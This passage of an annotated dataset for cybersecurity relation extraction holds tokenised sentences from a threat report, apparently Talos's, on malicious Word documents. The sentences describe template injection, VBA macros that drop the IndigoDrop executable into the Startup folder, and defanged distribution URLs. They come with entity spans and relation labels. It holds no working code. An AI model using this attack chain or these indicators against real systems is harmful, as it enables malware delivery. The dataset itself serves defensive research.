8}, {"r": "CO", "evidence": [2], "t": 6, "h": 7}, {"r": "CO", "evidence": [2, 3], "h": 7, "t": 9}, {"r": "WR", "evidence": [4], "t": 10, "h": 12}, {"r": "WR", "evidence": [4], "t": 11, "h": 12}, {"r": "EX", "evidence": [4], "h": 12, "t": 13}, {"r": "WR", "evidence": [4], "h": 12, "t": 14}, {"r": "RD", "evidence": [5], "t": 15, "h": 16}, {"r": "ST", "evidence": [5], "h": 16, "t": 17}, {"r": "RF", "evidence": [5], "h": 16, "t": 17}, {"r": "RD", "evidence": [6], "t": 18, "h": 19}, {"r": "RD", "evidence": [6], "h": 19, "t": 20}, {"r": "ST", "evidence": [6], "h": 19, "t": 21}, {"r": "RF", "evidence": [6], "h": 19, "t": 21}, {"r": "RD", "evidence": [7], "h": 22, "t": 23}, {"r": "WR", "evidence": [7], "h": 22, "t": 24}]}, {"title": "643-5", "sents": [["Malicious", "macro", "downloaded", "as", "part", "of", "an", "externally", "linked", "template", "that", "is", "then", "injected", "into", "the", "original", "lure", "maldoc", "."], ["These", "documents", "are", "aptly", "named", ":", "IAP39003.doc", "-", "Contains", "embedded", "malicious", "macro", "."], ["IAP39031.docx", "-", "Uses", "template", "injection", "."], ["Sample", "content", "of", "the", "maldoc", "lures", ":", "Fake", "document", "or", "weaponized", "copy", "?", "Many", "targeted", "attacks", "employing", "maldocs", "observed", "by", "Talos", "usually", "consist", "of", "utmost", "a", "couple", "of", "pages", "of", "decoy", "content", "to", "make", "them", "look", "legitimate", "."], ["Talos", "also", "found", "a", "benign", "copy", "of", "one", "of", "the", "maldocs", "indicating", "that", "it", "is", "highly", "likely", "that", "the", "attackers", "weaponized", "and", "distributed", "it", "to", "targets", "(", "Benign", "copy", "hash", ":", "0d16b15972d3d0f8a1481db4e2413a2c519e8ac49cd2bf3fca02cfa3ff0be532", ")", "."], ["Malicious", "VBA", "AnalysisThis", "section", "consists", "of", "an", "analysis", "of", "malicious", "macros", "used", "to", "carry", "out", "the", "attacks", "using", ":", "Locally", "embedded", "malicious", "macros", "andMalicious", "macros", "embedded", "in", "the", "injected", "templates", "downloaded", "from", "a", "remote", "location", "."], ["The", "malicious", "macros", "carry", "out", "the", "following", "malicious", "activities", ":", "Parse", "a", "Windows", "executable", "'", "s", "hardcoded", "bytes", "into", "bytes", "that", "can", "be", "written", "to", "a", "file", "on", "disk", "."], ["The", "parsed", "bytes", "are", "written", "to", "an", "EXE", "file", "in", "the", "currently", "logged", "in", "user", "'", "s", "Startup", "directory", ":", "E.", "g.", "%", "userprofile", "%", "\\AppData\\Roaming\\Microsoft\\Windows\\Start", "Menu\\Programs\\Startup\\anything.exeOnce", "the", "malicious", "EXE", "(", "second-stage", "payload", "IndigoDrop", ")", "has", "been", "written", "to", "the", "user", "'", "s", "Startup", "directory", "the", "macro", "quits", "execution", "without", "executing", "the", "actual", "second-stage", "payload", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "macro", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "template", "pos": [9, 10], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [21, 21], "name": "documents", "pos": [1, 2], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [26, 26], "name": "IAP39003.doc", "pos": [6, 7], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "macro", "pos": [11, 12], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [33, 33], "name": "IAP39031.docx", "pos": [0, 1], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [47, 47], "name": "document", "pos": [8, 9], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [49, 49], "name": "weaponized copy", "pos": [10, 12], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [54, 54], "name": "attacks", "pos": [15, 16], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [56, 56], "name": "maldocs", "pos": [17, 18], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [69, 69], "name": "decoy content", "pos": [30, 32], "index": "10_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [87, 87], "name": "maldocs", "pos": [10, 11], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [96, 96], "name": "attackers", "pos": [19, 20], "index": "12_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [102, 102], "name": "targets", "pos": [25, 26], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [121, 121], "name": "macros", "pos": [10, 11], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [127, 127], "name": "attacks", "pos": [16, 17], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [133, 133], "name": "macros", "pos": [22, 23], "index": "16_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [144, 144], "name": "remote location", "pos": [33, 35], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [149, 149], "name": "macros", "pos": [2, 3], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [160, 160], "name": "executable", "pos": [13, 14], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [173, 173], "name": "file", "pos": [26, 27], "index": "20_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [184, 184], "name": "EXE file", "pos": [7, 9], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [194, 194], "name": "Startup directory", "pos": [17, 19], "index": "22_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [209, 209], "name": "payload IndigoDrop", "pos": [32, 34], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [220, 220], "name": "Startup directory", "pos": [43, 45], "index": "24_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [223, 223], "name": "macro", "pos": [46, 47], "index": "25_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [231, 231], "name": "payload", "pos": [54, 55], "index": "26_0"}]], "labels": [{"r": "CO", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [1], "h": 3, "t": 4}, {"r": "CO", "evidence": [1], "t": 2, "h": 3}, {"r": "CO", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "WR", "evidence": [3], "t": 6, "h": 8}, {"r": "WR", "evidence": [3], "t": 7, "h": 8}, {"r": "EX", "evidence": [3], "h": 8, "t": 9}, {"r": "WR", "evidence": [3], "h": 8, "t": 10}, {"r": "RD", "evidence": [4], "t": 11, "h": 12}, {"r": "ST", "evidence": [4], "h": 12, "t": 13}, {"r": "RF", "evidence": [4], "h": 12, "t": 13}, {"r": "RD", "evidence": [5], "t": 14, "h": 15}, {"r": "RD", "evidence": [5], "h": 15, "t": 16}, {"r": "ST", "evidence": [5], "h": 15, "t": 17}, {"r": "RF", "evidence": [5], "h": 15, "t": 17}, {"r": "RD", "evidence": [6], "h": 18, "t": 19}, {"r": "WR", "evidence": [6], "h": 18, "t": 20}, {"r": "CO", "evidence": [6, 7], "h": 18, "t": 25}, {"r": "WR", "evidence": [7], "t": 23, "h": 25}, {"r": "EX", "evidence": [7], "h": 25, "t": 26}, {"r": "CO", "evidence": [7], "h": 21, "t": 22}, {"r": "CO", "evidence": [7], "h": 23, "t": 24}]}, {"title": "643-6", "sents": [["These", "documents", "are", "aptly", "named", ":", "IAP39003.doc", "-", "Contains", "embedded", "malicious", "macro", "."], ["IAP39031.docx", "-", "Uses", "template", "injection", "."], ["Sample", "content", "of", "the", "maldoc", "lures", ":", "Fake", "document", "or", "weaponized", "copy", "?", "Many", "targeted", "attacks", "employing", "maldocs", "observed", "by", "Talos", "usually", "consist", "of", "utmost", "a", "couple", "of", "pages", "of", "decoy", "content", "to", "make", "them", "look", "legitimate", "."], ["Talos", "also", "found", "a", "benign", "copy", "of", "one", "of", "the", "maldocs", "indicating", "that", "it", "is", "highly", "likely", "that", "the", "attackers", "weaponized", "and", "distributed", "it", "to", "targets", "(", "Benign", "copy", "hash", ":", "0d16b15972d3d0f8a1481db4e2413a2c519e8ac49cd2bf3fca02cfa3ff0be532", ")", "."], ["Malicious", "VBA", "AnalysisThis", "section", "consists", "of", "an", "analysis", "of", "malicious", "macros", "used", "to", "carry", "out", "the", "attacks", "using", ":", "Locally", "embedded", "malicious", "macros", "andMalicious", "macros", "embedded", "in", "the", "injected", "templates", "downloaded", "from", "a", "remote", "location", "."], ["The", "malicious", "macros", "carry", "out", "the", "following", "malicious", "activities", ":", "Parse", "a", "Windows", "executable", "'", "s", "hardcoded", "bytes", "into", "bytes", "that", "can", "be", "written", "to", "a", "file", "on", "disk", "."], ["The", "parsed", "bytes", "are", "written", "to", "an", "EXE", "file", "in", "the", "currently", "logged", "in", "user", "'", "s", "Startup", "directory", ":", "E.", "g.", "%", "userprofile", "%", "\\AppData\\Roaming\\Microsoft\\Windows\\Start", "Menu\\Programs\\Startup\\anything.exeOnce", "the", "malicious", "EXE", "(", "second-stage", "payload", "IndigoDrop", ")", "has", "been", "written", "to", "the", "user", "'", "s", "Startup", "directory", "the", "macro", "quits", "execution", "without", "executing", "the", "actual", "second-stage", "payload", "."], ["The", "attack", "relies", "on", "the", "user", "either", "logging", "in", "again", "or", "restarting", "the", "system", "to", "activate", "the", "second-stage", "payload", "on", "the", "infected", "endpoint", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "documents", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "IAP39003.doc", "pos": [6, 7], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [11, 11], "name": "macro", "pos": [11, 12], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [13, 13], "name": "IAP39031.docx", "pos": [0, 1], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [27, 27], "name": "document", "pos": [8, 9], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [29, 29], "name": "weaponized copy", "pos": [10, 12], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [34, 34], "name": "attacks", "pos": [15, 16], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [36, 36], "name": "maldocs", "pos": [17, 18], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [49, 49], "name": "decoy content", "pos": [30, 32], "index": "8_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [67, 67], "name": "maldocs", "pos": [10, 11], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [76, 76], "name": "attackers", "pos": [19, 20], "index": "10_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [82, 82], "name": "targets", "pos": [25, 26], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [101, 101], "name": "macros", "pos": [10, 11], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [107, 107], "name": "attacks", "pos": [16, 17], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [113, 113], "name": "macros", "pos": [22, 23], "index": "14_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [124, 124], "name": "remote location", "pos": [33, 35], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [129, 129], "name": "macros", "pos": [2, 3], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [140, 140], "name": "executable", "pos": [13, 14], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [153, 153], "name": "file", "pos": [26, 27], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [164, 164], "name": "EXE file", "pos": [7, 9], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [174, 174], "name": "Startup directory", "pos": [17, 19], "index": "20_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [189, 189], "name": "payload IndigoDrop", "pos": [32, 34], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [200, 200], "name": "Startup directory", "pos": [43, 45], "index": "22_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [203, 203], "name": "macro", "pos": [46, 47], "index": "23_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [211, 211], "name": "payload", "pos": [54, 55], "index": "24_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [214, 214], "name": "attack", "pos": [1, 2], "index": "25_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [231, 231], "name": "payload", "pos": [18, 19], "index": "26_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [235, 235], "name": "endpoint", "pos": [22, 23], "index": "27_0"}]], "labels": [{"r": "CO", "evidence": [0], "h": 1, "t": 2}, {"r": "CO", "evidence": [0], "t": 0, "h": 1}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "WR", "evidence": [2], "t": 4, "h": 6}, {"r": "WR", "evidence": [2], "t": 5, "h": 6}, {"r": "EX", "evidence": [2], "h": 6, "t": 7}, {"r": "WR", "evidence": [2], "h": 6, "t": 8}, {"r": "RD", "evidence": [3], "t": 9, "h": 10}, {"r": "ST", "evidence": [3], "h": 10, "t": 11}, {"r": "RF", "evidence": [3], "h": 10, "t": 11}, {"r": "RD", "evidence": [4], "t": 12, "h": 13}, {"r": "RD", "evidence": [4], "h": 13, "t": 14}, {"r": "ST", "evidence": [4], "h": 13, "t": 15}, {"r": "RF", "evidence": [4], "h": 13, "t": 15}, {"r": "RD", "evidence": [5], "h": 16, "t": 17}, {"r": "WR", "evidence": [5], "h": 16, "t": 18}, {"r": "CO", "evidence": [5, 6], "h": 16, "t": 23}, {"r": "WR", "evidence": [6], "t": 21, "h": 23}, {"r": "EX", "evidence": [6], "h": 23, "t": 24}, {"r": "CO", "evidence": [6], "h": 19, "t": 20}, {"r": "CO", "evidence": [6], "h": 21, "t": 22}, {"r": "EX", "evidence": [7], "h": 25, "t": 26}, {"r": "ST", "evidence": [7], "h": 25, "t": 27}, {"r": "RF", "evidence": [7], "h": 25, "t": 27}]}, {"title": "643-7", "sents": [["IAP39031.docx", "-", "Uses", "template", "injection", "."], ["Sample", "content", "of", "the", "maldoc", "lures", ":", "Fake", "document", "or", "weaponized", "copy", "?", "Many", "targeted", "attacks", "employing", "maldocs", "observed", "by", "Talos", "usually", "consist", "of", "utmost", "a", "couple", "of", "pages", "of", "decoy", "content", "to", "make", "them", "look", "legitimate", "."], ["Talos", "also", "found", "a", "benign", "copy", "of", "one", "of", "the", "maldocs", "indicating", "that", "it", "is", "highly", "likely", "that", "the", "attackers", "weaponized", "and", "distributed", "it", "to", "targets", "(", "Benign", "copy", "hash", ":", "0d16b15972d3d0f8a1481db4e2413a2c519e8ac49cd2bf3fca02cfa3ff0be532", ")", "."], ["Malicious", "VBA", "AnalysisThis", "section", "consists", "of", "an", "analysis", "of", "malicious", "macros", "used", "to", "carry", "out", "the", "attacks", "using", ":", "Locally", "embedded", "malicious", "macros", "andMalicious", "macros", "embedded", "in", "the", "injected", "templates", "downloaded", "from", "a", "remote", "location", "."], ["The", "malicious", "macros", "carry", "out", "the", "following", "malicious", "activities", ":", "Parse", "a", "Windows", "executable", "'", "s", "hardcoded", "bytes", "into", "bytes", "that", "can", "be", "written", "to", "a", "file", "on", "disk", "."], ["The", "parsed", "bytes", "are", "written", "to", "an", "EXE", "file", "in", "the", "currently", "logged", "in", "user", "'", "s", "Startup", "directory", ":", "E.", "g.", "%", "userprofile", "%", "\\AppData\\Roaming\\Microsoft\\Windows\\Start", "Menu\\Programs\\Startup\\anything.exeOnce", "the", "malicious", "EXE", "(", "second-stage", "payload", "IndigoDrop", ")", "has", "been", "written", "to", "the", "user", "'", "s", "Startup", "directory", "the", "macro", "quits", "execution", "without", "executing", "the", "actual", "second-stage", "payload", "."], ["The", "attack", "relies", "on", "the", "user", "either", "logging", "in", "again", "or", "restarting", "the", "system", "to", "activate", "the", "second-stage", "payload", "on", "the", "infected", "endpoint", "."], ["The", "second-stage", "payload", "in", "this", "attack", "is", "a", "custom", "dropper", "(", "IndigoDrop", ")", "that", "carries", "out", "a", "variety", "of", "tasks", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [0, 0], "name": "IAP39031.docx", "pos": [0, 1], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [14, 14], "name": "document", "pos": [8, 9], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [16, 16], "name": "weaponized copy", "pos": [10, 12], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [21, 21], "name": "attacks", "pos": [15, 16], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [23, 23], "name": "maldocs", "pos": [17, 18], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [36, 36], "name": "decoy content", "pos": [30, 32], "index": "5_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [54, 54], "name": "maldocs", "pos": [10, 11], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [63, 63], "name": "attackers", "pos": [19, 20], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [69, 69], "name": "targets", "pos": [25, 26], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [88, 88], "name": "macros", "pos": [10, 11], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [94, 94], "name": "attacks", "pos": [16, 17], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [100, 100], "name": "macros", "pos": [22, 23], "index": "11_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [111, 111], "name": "remote location", "pos": [33, 35], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [116, 116], "name": "macros", "pos": [2, 3], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [127, 127], "name": "executable", "pos": [13, 14], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [140, 140], "name": "file", "pos": [26, 27], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [151, 151], "name": "EXE file", "pos": [7, 9], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [161, 161], "name": "Startup directory", "pos": [17, 19], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [176, 176], "name": "payload IndigoDrop", "pos": [32, 34], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [187, 187], "name": "Startup directory", "pos": [43, 45], "index": "19_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [190, 190], "name": "macro", "pos": [46, 47], "index": "20_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [198, 198], "name": "payload", "pos": [54, 55], "index": "21_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [201, 201], "name": "attack", "pos": [1, 2], "index": "22_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [218, 218], "name": "payload", "pos": [18, 19], "index": "23_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [222, 222], "name": "endpoint", "pos": [22, 23], "index": "24_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [226, 226], "name": "payload", "pos": [2, 3], "index": "25_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [233, 233], "name": "dropper", "pos": [9, 10], "index": "26_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [243, 243], "name": "tasks", "pos": [19, 20], "index": "27_0"}]], "labels": [{"r": "WR", "evidence": [1], "t": 1, "h": 3}, {"r": "WR", "evidence": [1], "t": 2, "h": 3}, {"r": "EX", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [1], "h": 3, "t": 5}, {"r": "RD", "evidence": [2], "t": 6, "h": 7}, {"r": "ST", "evidence": [2], "h": 7, "t": 8}, {"r": "RF", "evidence": [2], "h": 7, "t": 8}, {"r": "RD", "evidence": [3], "t": 9, "h": 10}, {"r": "RD", "evidence": [3], "h": 10, "t": 11}, {"r": "ST", "evidence": [3], "h": 10, "t": 12}, {"r": "RF", "evidence": [3], "h": 10, "t": 12}, {"r": "RD", "evidence": [4], "h": 13, "t": 14}, {"r": "WR", "evidence": [4], "h": 13, "t": 15}, {"r": "CO", "evidence": [4, 5], "h": 13, "t": 20}, {"r": "WR", "evidence": [5], "t": 18, "h": 20}, {"r": "EX", "evidence": [5], "h": 20, "t": 21}, {"r": "CO", "evidence": [5], "h": 16, "t": 17}, {"r": "CO", "evidence": [5], "h": 18, "t": 19}, {"r": "EX", "evidence": [6], "h": 22, "t": 23}, {"r": "ST", "evidence": [6], "h": 22, "t": 24}, {"r": "RF", "evidence": [6], "h": 22, "t": 24}, {"r": "CO", "evidence": [6, 7], "h": 23, "t": 25}, {"r": "EX", "evidence": [7], "t": 25, "h": 26}, {"r": "FR", "evidence": [7], "h": 26, "t": 27}]}, {"title": "643-8", "sents": [["Sample", "content", "of", "the", "maldoc", "lures", ":", "Fake", "document", "or", "weaponized", "copy", "?", "Many", "targeted", "attacks", "employing", "maldocs", "observed", "by", "Talos", "usually", "consist", "of", "utmost", "a", "couple", "of", "pages", "of", "decoy", "content", "to", "make", "them", "look", "legitimate", "."], ["Talos", "also", "found", "a", "benign", "copy", "of", "one", "of", "the", "maldocs", "indicating", "that", "it", "is", "highly", "likely", "that", "the", "attackers", "weaponized", "and", "distributed", "it", "to", "targets", "(", "Benign", "copy", "hash", ":", "0d16b15972d3d0f8a1481db4e2413a2c519e8ac49cd2bf3fca02cfa3ff0be532", ")", "."], ["Malicious", "VBA", "AnalysisThis", "section", "consists", "of", "an", "analysis", "of", "malicious", "macros", "used", "to", "carry", "out", "the", "attacks", "using", ":", "Locally", "embedded", "malicious", "macros", "andMalicious", "macros", "embedded", "in", "the", "injected", "templates", "downloaded", "from", "a", "remote", "location", "."], ["The", "malicious", "macros", "carry", "out", "the", "following", "malicious", "activities", ":", "Parse", "a", "Windows", "executable", "'", "s", "hardcoded", "bytes", "into", "bytes", "that", "can", "be", "written", "to", "a", "file", "on", "disk", "."], ["The", "parsed", "bytes", "are", "written", "to", "an", "EXE", "file", "in", "the", "currently", "logged", "in", "user", "'", "s", "Startup", "directory", ":", "E.", "g.", "%", "userprofile", "%", "\\AppData\\Roaming\\Microsoft\\Windows\\Start", "Menu\\Programs\\Startup\\anything.exeOnce", "the", "malicious", "EXE", "(", "second-stage", "payload", "IndigoDrop", ")", "has", "been", "written", "to", "the", "user", "'", "s", "Startup", "directory", "the", "macro", "quits", "execution", "without", "executing", "the", "actual", "second-stage", "payload", "."], ["The", "attack", "relies", "on", "the", "user", "either", "logging", "in", "again", "or", "restarting", "the", "system", "to", "activate", "the", "second-stage", "payload", "on", "the", "infected", "endpoint", "."], ["The", "second-stage", "payload", "in", "this", "attack", "is", "a", "custom", "dropper", "(", "IndigoDrop", ")", "that", "carries", "out", "a", "variety", "of", "tasks", "."], ["Malicious", "macro", "code", ":", "Maldoc", "distributionOne", "of", "the", "maldocs", "disclosed", "here", "was", "referred", "to", "by", "a", "Bit.ly-shortened", "URL", "(", "created", "Jan.", "23", ",", "2020", ")", "hxxp", ":", "//bit.ly/iaf-guidelines", "which", "redirects", "to", "hxxp", ":", "//tecbeck.com/IAP39031.docx.It", "is", "highly", "likely", "that", "the", "attackers", "hosted", "the", "maldocs", "on", "a", "public", "server", "and", "distributed", "the", "direct", "or", "Bit.ly", "links", "to", "the", "targets", "in", "the", "form", "of", "spear-phishing", "emails", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "document", "pos": [8, 9], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "weaponized copy", "pos": [10, 12], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [15, 15], "name": "attacks", "pos": [15, 16], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [17, 17], "name": "maldocs", "pos": [17, 18], "index": "3_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [30, 30], "name": "decoy content", "pos": [30, 32], "index": "4_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [48, 48], "name": "maldocs", "pos": [10, 11], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [57, 57], "name": "attackers", "pos": [19, 20], "index": "6_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [63, 63], "name": "targets", "pos": [25, 26], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [82, 82], "name": "macros", "pos": [10, 11], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [88, 88], "name": "attacks", "pos": [16, 17], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [94, 94], "name": "macros", "pos": [22, 23], "index": "10_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [105, 105], "name": "remote location", "pos": [33, 35], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [110, 110], "name": "macros", "pos": [2, 3], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [121, 121], "name": "executable", "pos": [13, 14], "index": "13_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [134, 134], "name": "file", "pos": [26, 27], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [145, 145], "name": "EXE file", "pos": [7, 9], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [155, 155], "name": "Startup directory", "pos": [17, 19], "index": "16_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [170, 170], "name": "payload IndigoDrop", "pos": [32, 34], "index": "17_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [181, 181], "name": "Startup directory", "pos": [43, 45], "index": "18_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [184, 184], "name": "macro", "pos": [46, 47], "index": "19_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [192, 192], "name": "payload", "pos": [54, 55], "index": "20_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [195, 195], "name": "attack", "pos": [1, 2], "index": "21_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [212, 212], "name": "payload", "pos": [18, 19], "index": "22_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [216, 216], "name": "endpoint", "pos": [22, 23], "index": "23_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [220, 220], "name": "payload", "pos": [2, 3], "index": "24_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [227, 227], "name": "dropper", "pos": [9, 10], "index": "25_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [237, 237], "name": "tasks", "pos": [19, 20], "index": "26_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [240, 240], "name": "macro code", "pos": [1, 3], "index": "27_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [247, 247], "name": "maldocs", "pos": [8, 9], "index": "28_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [256, 256], "name": "URL", "pos": [17, 18], "index": "29_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [270, 270], "name": "hxxp : //tecbeck.com/IAP39031.docx.It", "pos": [31, 34], "index": "30_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [278, 278], "name": "attackers", "pos": [39, 40], "index": "31_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [281, 281], "name": "maldocs", "pos": [42, 43], "index": "32_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [285, 285], "name": "server", "pos": [46, 47], "index": "33_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [291, 291], "name": "Bit.ly links", "pos": [52, 54], "index": "34_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [301, 301], "name": "emails", "pos": [62, 63], "index": "35_0"}]], "labels": [{"r": "WR", "evidence": [0], "t": 0, "h": 2}, {"r": "WR", "evidence": [0], "t": 1, "h": 2}, {"r": "EX", "evidence": [0], "h": 2, "t": 3}, {"r": "WR", "evidence": [0], "h": 2, "t": 4}, {"r": "RD", "evidence": [1], "t": 5, "h": 6}, {"r": "ST", "evidence": [1], "h": 6, "t": 7}, {"r": "RF", "evidence": [1], "h": 6, "t": 7}, {"r": "CO", "evidence": [1, 2, 3, 4, 5, 6, 7], "h": 6, "t": 31}, {"r": "RD", "evidence": [2], "t": 8, "h": 9}, {"r": "RD", "evidence": [2], "h": 9, "t": 10}, {"r": "ST", "evidence": [2], "h": 9, "t": 11}, {"r": "RF", "evidence": [2], "h": 9, "t": 11}, {"r": "RD", "evidence": [3], "h": 12, "t": 13}, {"r": "WR", "evidence": [3], "h": 12, "t": 14}, {"r": "CO", "evidence": [3, 4], "h": 12, "t": 19}, {"r": "WR", "evidence": [4], "t": 17, "h": 19}, {"r": "EX", "evidence": [4], "h": 19, "t": 20}, {"r": "CO", "evidence": [4], "h": 15, "t": 16}, {"r": "CO", "evidence": [4], "h": 17, "t": 18}, {"r": "EX", "evidence": [5], "h": 21, "t": 22}, {"r": "ST", "evidence": [5], "h": 21, "t": 23}, {"r": "RF", "evidence": [5], "h": 21, "t": 23}, {"r": "CO", "evidence": [5, 6], "h": 22, "t": 24}, {"r": "EX", "evidence": [6], "t": 24, "h": 25}, {"r": "FR", "evidence": [6], "h": 25, "t": 26}, {"r": "EX", "evidence": [7], "t": 27, "h": 28}, {"r": "ST", "evidence": [7], "h": 28, "t": 29}, {"r": "RF", "evidence": [7], "h": 28, "t": 29}, {"r": "ST", "evidence": [7], "h": 28, "t": 30}, {"r": "RF", "evidence": [7], "h": 28, "t": 30}, {"r": "FR", "evidence": [7], "h": 31, "t": 32}, {"r": "ST", "evidence": [7], "h": 31, "t": 33}, {"r": "RF", "evidence": [7], "h": 31, "t": 33}, {"r": "ST", "evidence": [7], "h": 31, "t": 34}, {"r": "RF", "evidence": [7], "h": 31, "t": 34}, {"r": "WR", "evidence": [7], "h": 31, "t": 